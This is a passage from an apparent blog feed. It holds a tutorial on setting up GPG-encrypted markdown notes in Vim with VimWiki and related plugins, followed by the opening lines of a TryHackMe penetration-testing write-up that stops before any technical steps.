&lt;li&gt;markdown-preview: &lt;a href="https://github.com/iamcco/markdown-preview.nvim" rel="nofollow"&gt;https://github.com/iamcco/markdown-preview.nvim&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;markdown-image-paste: &lt;a href="https://github.com/ferrine/md-img-paste.vim" rel="nofollow"&gt;https://github.com/ferrine/md-img-paste.vim&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Note encryption will be done via some vim scripting. Let&amp;#39;s roll and set up everything!&lt;/p&gt;

&lt;h2&gt;Plugins installation&lt;/h2&gt;

&lt;p&gt;First things first, let&amp;#39;s install all the plugins in your &lt;code&gt;.vimrc&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;Plug &lt;span class="s1"&gt;'plasticboy/vim-markdown'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;'for'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'markdown'&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
Plug &lt;span class="s1"&gt;'ferrine/md-img-paste.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;'for'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'markdown'&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
Plug &lt;span class="s1"&gt;'vimwiki/vimwiki'&lt;/span&gt;
Plug &lt;span class="s1"&gt;'iamcco/markdown-preview.nvim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="s1"&gt;'do'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="p"&gt;-&amp;gt;&lt;/span&gt; mkdp#util#install&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="s1"&gt;'for'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'markdown'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'vim-plug'&lt;/span&gt;&lt;span class="p"&gt;]}&lt;/span&gt;
Plug &lt;span class="s1"&gt;'junegunn/goyo.vim'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Goyo is optional but provides an amazing, minimalist interface for notes — I highly recommend it. Note that the following snippet is based on vim-plug: adapt it accordingly if you use another plugin manager, and run the appropriate install command (&lt;code&gt;:PlugInstall&lt;/code&gt; in my case).&lt;/p&gt;

&lt;h2&gt;Setting up encryption with markdown&lt;/h2&gt;

&lt;p&gt;Let&amp;#39;s populate our .vimrc with a few more settings to get seamless encryption. First we&amp;#39;re going to assign the .md.gpg extension to the markdown filetype, so vim can apply highlighting and other features like it normally would:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;BufEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="k"&gt;filetype&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;markdown
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The seamless editing of .gpg files will be handled by an edited mix of the following scripts:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://vim.fandom.com/wiki/Encryption" rel="nofollow"&gt;https://vim.fandom.com/wiki/Encryption&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://vim.fandom.com/wiki/Edit_gpg_encrypted_files#Comments" rel="nofollow"&gt;https://vim.fandom.com/wiki/Edit_gpg_encrypted_files#Comments&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Be aware that nothing is foolproof here, as vim uses temporary files when dealing with data from external programs. While those scripts harden everything as much as possible, you still might be able to retrieve some of your data with forensics—which is an accepted risk in my case.&lt;/p&gt;

&lt;p&gt;One issue with those scripts used in conjunction with VimWiki is the management of buffers: VimWiki will open tons of them, and closing / saving them individually can prevent remaining files to remain tightly encrypted at rest.&lt;/p&gt;

&lt;p&gt;The most practical solution I found is to always quit the wiki entirely, trust its autosaving feature and treat the bunch of buffers as a unique group this way. As such and to enforce this, I opted to remap &lt;code&gt;:wq&lt;/code&gt;, &lt;code&gt;:q&lt;/code&gt;, and disable &lt;code&gt;:w&lt;/code&gt; and &lt;code&gt;:q&lt;/code&gt; for the &lt;code&gt;.md.gpg&lt;/code&gt; filetype exclusively:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev wq wqa"&lt;/span&gt;
&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev q qa"&lt;/span&gt;
&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev w &amp;lt;Nop&amp;gt;"&lt;/span&gt;
&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":cabbrev wa &amp;lt;Nop&amp;gt;"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Some people might find this to be cursed, and if you hate autosaving I feel you. On my end that solution works perfectly but I&amp;#39;m always open to suggestions!&lt;/p&gt;

&lt;p&gt;Next comes the automatic handling and editing of gpg files:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="c"&gt;" First make sure nothing is written to ~/.viminfo or backups while editing&lt;/span&gt;
&lt;span class="c"&gt;" an encrypted file.&lt;/span&gt;
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;backupskip&lt;/span&gt;&lt;span class="p"&gt;+=&lt;/span&gt;*&lt;span class="p"&gt;.&lt;/span&gt;gpg
&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;viminfo&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;

augroup encrypted
  &lt;span class="k"&gt;au&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt;
  &lt;span class="c"&gt;" Disable swap file, undo file and backups, and set binary file format&lt;/span&gt;
  &lt;span class="c"&gt;" before reading the file&lt;/span&gt;
  autocmd &lt;span class="nb"&gt;BufReadPre&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;FileReadPre&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;gpg
&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="k"&gt;noswapfile&lt;/span&gt; &lt;span class="nb"&gt;noundofile&lt;/span&gt; &lt;span class="nb"&gt;nobackup&lt;/span&gt; &lt;span class="nb"&gt;bin&lt;/span&gt;
  &lt;span class="c"&gt;" Decrypt contents after reading the file, reset binary file format&lt;/span&gt;
  &lt;span class="c"&gt;" and run any BufReadPost autocmds matching the filename without .gpg&lt;/span&gt;
  autocmd &lt;span class="nb"&gt;BufReadPost&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;FileReadPost&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;gpg
&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"%!gpg --decrypt --default-recipient-self 2&amp;gt;/dev/null"&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="nb"&gt;nobin&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"redraw!"&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"doautocmd BufReadPost "&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="nb"&gt;expand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"%:r"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="c"&gt;" Set binary file format and encrypt contents when leaving vim&lt;/span&gt;
  autocmd Vimleave *&lt;span class="p"&gt;.&lt;/span&gt;gpg
&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;setlocal&lt;/span&gt; &lt;span class="nb"&gt;bin&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="se"&gt;    \&lt;/span&gt; &lt;span class="k"&gt;bufdo&lt;/span&gt; &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;"%!gpg --encrypt --armor --default-recipient-self"&lt;/span&gt;
  &lt;span class="c"&gt;" Contrary to the original scripts, we are not handling an undo command&lt;/span&gt;
  &lt;span class="c"&gt;" to revert encryption in buffer: vimwiki auto-saves contents when quitting,&lt;/span&gt;
  &lt;span class="c"&gt;" so we rather leave it at that and disable :w and :wa for .md.gpg files.&lt;/span&gt;
  &lt;span class="c"&gt;" If you don't like auto-saving, sorry!&lt;/span&gt;
augroup END
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You will need to have a GPG keypair present on your system for this to work. If you don&amp;#39;t already have one, here&amp;#39;s how to do it:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Run &lt;code&gt;gpg --full-generate-key&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Select the default key type at the prompt.&lt;/li&gt;
&lt;li&gt;Pick at least a key size of 4096 bits.&lt;/li&gt;
&lt;li&gt;Set your key to never expire, which is the default length of time at the prompt.&lt;/li&gt;
&lt;li&gt;Check your settings.&lt;/li&gt;
&lt;li&gt;Add your ID information.&lt;/li&gt;
&lt;li&gt;Provide a strong passphrase when prompted.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you&amp;#39;d rather go crazy with ECC and ED25519 (which I encourage you to do), you can do the following instead:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Run &lt;code&gt;gpg --expert --full-generate-key&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Pick &lt;code&gt;ECC and ECC&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Pick &lt;code&gt;Curve 25519&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Follow the same instructions as before.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This part should be working now! Create a &lt;code&gt;.md.gpg&lt;/code&gt; file, open it with vim, insert something and save it. If you &lt;code&gt;cat&lt;/code&gt; the file, this should return the encrypted, ASCII-armored content which roughly looks like the following:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nt"&gt;-----BEGIN&lt;/span&gt; PGP MESSAGE-----

hQIMA4RrtUt4dcSyAQ/8DAdDoYkJE8d4kq+dsZykX9qR2cEVjy99RLaaeT22HffP
SKc3zKXMz6IDVEx1+KBD0zsDR1EZA6tiOoXwqjZnU/CXwuGpE6yYrIjQZiyVsDhV
zeYupkji0z8JTg8QfAfgW2TvEpctuX7DaXyn26qmg6x1KVhmxDAaaaqQzJIu2dXg
mM8gnU8Qgx0/hPUf9Axm4lTU/iqZLEFOr+ysRn7BX4OSnkfWUIKGOASLqX7l42/+
s8YxKRSsJEAf/vdUxgEABTRKQ7Z/ciMn7Lp8gqz4hhLvgwG7gZz6dYgO5f3F0L+h
oMJnTKOHxkcYPRJODA7jclYqTapSkHXTs1Gl0/d2vjuzYOS9izs6p+iG5eXaZ93a
83gc4FgVAsxnLPx+M8KmmgQBM2f91NUbYdcA/8sGmzSpHBm7vVhCqm9iZLmqFgtW
C2Ygwek5KTNuQ0kNYaGz88047oaQn6jYTR146YWxZBkTOO/9xsEQxlrwBOVLW9vX
qpnRI6Bj0c7Gnb5eh3TBBKJyfKB1r41PBzAoMCr4LBFNjJhtFQmrcV/h+6kqYpE9
xSju2Ux72H3Nq1UBmGO8u2Or8BgQXRnWmTjaGFKetUac1KuHVdSl6gkTkK2TVSJh
dwMiPavB4hf6onJqGlW9746glNTRdfmHU9Bvsz6iBJ3HV6EOTCG2XLyU2fr6vvXS
UQEWWmozZNWc75PUQBSwXDeLUTZU7n3QG0O2dx6brjxbx0hrv3oYYAersvX3NrPK
mgkSHV0XVcSVvG4uLma1ilDMWKb9+DjiZDt2FvqVFV7E3A&lt;span class="o"&gt;==&lt;/span&gt;
&lt;span class="o"&gt;=&lt;/span&gt;zjQv
&lt;span class="nt"&gt;-----END&lt;/span&gt; PGP MESSAGE-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Open it again with vim, and you should see the plaintext message. Perfect, moving on!&lt;/p&gt;

&lt;h2&gt;Setting up VimWiki&lt;/h2&gt;

&lt;p&gt;By default, vimwiki uses its own syntax. Markdown is however supported with a few option changes.&lt;/p&gt;

&lt;p&gt;The plugin also needs some specific settings to be set, so let&amp;#39;s do both:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;set&lt;/span&gt; &lt;span class="nb"&gt;nocompatible&lt;/span&gt;
filetypelugin &lt;span class="k"&gt;on&lt;/span&gt;
&lt;span class="nb"&gt;syntax&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_list&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[{&lt;/span&gt;&lt;span class="s1"&gt;'path'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'~/wiki/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="se"&gt;                      \&lt;/span&gt; &lt;span class="s1"&gt;'syntax'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'markdown'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'ext'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'.md.gpg'&lt;/span&gt;&lt;span class="p"&gt;}]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now VimWiki will identify &lt;code&gt;.md.gpg&lt;/code&gt; as its default filetype, and the directory for your entire wiki will be located at &lt;code&gt;~/wiki/&lt;/code&gt;. Easy enough.&lt;/p&gt;

&lt;p&gt;Learning everything about VimWiki is beyond the scope of this post, but we can still mention a few things. First, you need to create an index by running &lt;code&gt;vim&lt;/code&gt; and press &lt;code&gt;&amp;lt;Leader&amp;gt;ww&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Edit the document as you like, and press &lt;code&gt;&amp;lt;enter&amp;gt;&lt;/code&gt; with your cursor placed on a word of your choosing: you just made a link! If you press &lt;code&gt;&amp;lt;enter&amp;gt;&lt;/code&gt; again, you&amp;#39;ll open a new file which you can edit to your linking. Press backspace, and you&amp;#39;re back to your index.&lt;/p&gt;

&lt;p&gt;This hierarchical way of handling files makes VimWiki very suitable for personal notes and even a zettelkasten system (there is an &lt;a href="https://github.com/michal-h21/vim-zettel" rel="nofollow"&gt;additional plugin&lt;/a&gt; for it). You can learn more about it in the &lt;a href="https://github.com/vimwiki/vimwiki" rel="nofollow"&gt;repo&amp;#39;s README&lt;/a&gt; and &lt;a href="https://vimwiki.github.io/vimwikiwiki/" rel="nofollow"&gt;VimWiki&amp;#39;s wiki&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We&amp;#39;re done with setting the plugin, but these are some options I like to tweak:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="c"&gt;" Automatically insert a header when creating a new link&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_auto_header&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="c"&gt;" Use underscores to replace spaces in the file names&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_links_space_char&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'_'&lt;/span&gt;
&lt;span class="c"&gt;" Disable all concealing&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_conceal_onechar_markers&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="c"&gt;" Disable URL shortening&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_url_maxsave&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; 
&lt;span class="c"&gt;" Don't load VimWiki for markdown files located somewhere else&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:vimwiki_global_ext&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="c"&gt;" Bold headers&lt;/span&gt;
&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader1 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader2 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader3 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader4 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader5 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; 
&lt;span class="k"&gt;hi&lt;/span&gt; VimwikiHeader6 cterm&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt; &lt;span class="k"&gt;gui&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;bold&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Autocapitalisation&lt;/h2&gt;

&lt;p&gt;This feature will be quick to implement. The following function will handle Autocapitalisation wherever we want to:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;func&lt;span class="p"&gt;!&lt;/span&gt; AutoCapitalisation&lt;span class="p"&gt;()&lt;/span&gt; 
    augroup SENTENCES 
        &lt;span class="k"&gt;au&lt;/span&gt;&lt;span class="p"&gt;!&lt;/span&gt; 
        autocmd &lt;span class="nb"&gt;InsertCharPre&lt;/span&gt; * &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'\v(%^|[.!?]\_s+|\_^\-\s|\_^\*\s|\_^#+\s|\n\n)%#'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'bcnw'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;v&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;char &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;toupper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;v&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;char&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;endif&lt;/span&gt; 
    augroup END 
endfu
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It has been tweaked from the following source and does a really nice job:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://davidxmoody.com/2014/vim-auto-capitalisation/" rel="nofollow"&gt;https://davidxmoody.com/2014/vim-auto-capitalisation/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(Thanks David Moody for sharing it!)&lt;/p&gt;

&lt;p&gt;To enable the function with VimWiki, all we need to do is the following:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; markdown &lt;span class="k"&gt;call&lt;/span&gt; AutoCapitalisation&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Easily pasting images in markdown files&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;md-img-paste&lt;/code&gt; plugin uses &lt;code&gt;xclip&lt;/code&gt; to work, so let&amp;#39;s install it first:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;sudo &lt;/span&gt;apt &lt;span class="nb"&gt;install &lt;/span&gt;xclip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The following options can be tweaked to your liking. By default, the plugin will create your image folder at the same location of the currently edited file, which works great for us:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; markdown nmap &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="k"&gt;silent&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;leader&lt;span class="p"&gt;&amp;gt;,&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="k"&gt;call&lt;/span&gt; mdip#MarkdownClipboardImage&lt;span class="p"&gt;()&amp;lt;&lt;/span&gt;CR&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="c"&gt;" There are some defaults for image directory and image name, you can change them&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:mdip_imgdir&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'images'&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;g:mdip_imgname&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'image'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Markdown preview&lt;/h2&gt;

&lt;p&gt;This plugin works splendidly well out of the box. Just use &lt;code&gt;:MarkdownPreview&lt;/code&gt; for a live preview and &lt;code&gt;:MarkdownPreviewStop&lt;/code&gt; to stop the service. I only added this shortcut for easy toggling:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;autocmd &lt;span class="nb"&gt;FileType&lt;/span&gt; markdown nmap &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;leader&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="k"&gt;n&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;MarkdownPreviewToggle&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;CR&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It also supports preview of diagrams written with mermaid, katex, and others, really an amazing plugin.&lt;/p&gt;

&lt;h2&gt;Optional (but amazing): goyo&lt;/h2&gt;

&lt;p&gt;Goyo is a vim plugin that provides a clutter-free interface for writing in vim: I really enjoyed using it for a long time now, and nothing else quite matched the experience. I recommend checking out the &lt;a href="https://github.com/junegunn/goyo.vim" rel="nofollow"&gt;GitHub repo&lt;/a&gt; to get a general feel of the interface.&lt;/p&gt;

&lt;p&gt;If you want to use it automatically with vimwiki, add the following line in your &lt;code&gt;.vimrc&lt;/code&gt;:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight viml"&gt;&lt;code&gt;&lt;span class="k"&gt;au&lt;/span&gt; &lt;span class="nb"&gt;VimEnter&lt;/span&gt; *&lt;span class="p"&gt;.&lt;/span&gt;md&lt;span class="p"&gt;.&lt;/span&gt;gpg &lt;span class="nb"&gt;execute&lt;/span&gt; &lt;span class="s2"&gt;":Goyo"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Caveats&lt;/h2&gt;

&lt;p&gt;Switching to VimWiki has a few caveats, at least with my current settings:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;File names are not encrypted.&lt;/li&gt;
&lt;li&gt;Images are not encrypted.&lt;/li&gt;
&lt;li&gt;Encrypting things through vim is... a peculiar experience to say the least.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;But in my use case, I can live with that.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m always open to suggestions and my vim scripting is not the best, but so far the experience is really pleasant. Being able to quickly write notes from the CLI with the full power of vim available is way better than any alternative I could find!&lt;/p&gt;

&lt;h2&gt;TL;DR: just give me the script!&lt;/h2&gt;

&lt;p&gt;Sure thing: &lt;a href="https://gist.github.com/ovelny/72659e841c1dbcee173eb244c8609252" rel="nofollow"&gt;https://gist.github.com/ovelny/72659e841c1dbcee173eb244c8609252&lt;/a&gt;&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:ovelny.sh,2021-03-12:/blog/tryhackme-writeup-relevant/</id>
    <title type="html">TryHackMe writeup: Relevant</title>
    <published>2021-03-12T00:00:00Z</published>
    <updated>2021-03-12T00:00:00Z</updated>
    <link rel="alternate" href="https://ovelny.sh/blog/tryhackme-writeup-relevant/" type="text/html"/>
    <content type="html">&lt;p&gt;Relevant is a TryHackMe room designed to simulate a black box penetration test. As such, no information is provided about the target whatsoever, with the exception of its scope. As proof of exploitation, two flags must be secured:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;user.txt&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;root.txt&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While the target has several vulnerabilities that can be exploited, this write-up will only focus on one of them. Let&amp;#39;s begin!&lt;/p&gt;

&lt;h2&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;As always, a good point to start with active reconnaissance is to enumerate open ports and services on our target. Let&amp;#39;s begin with &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;

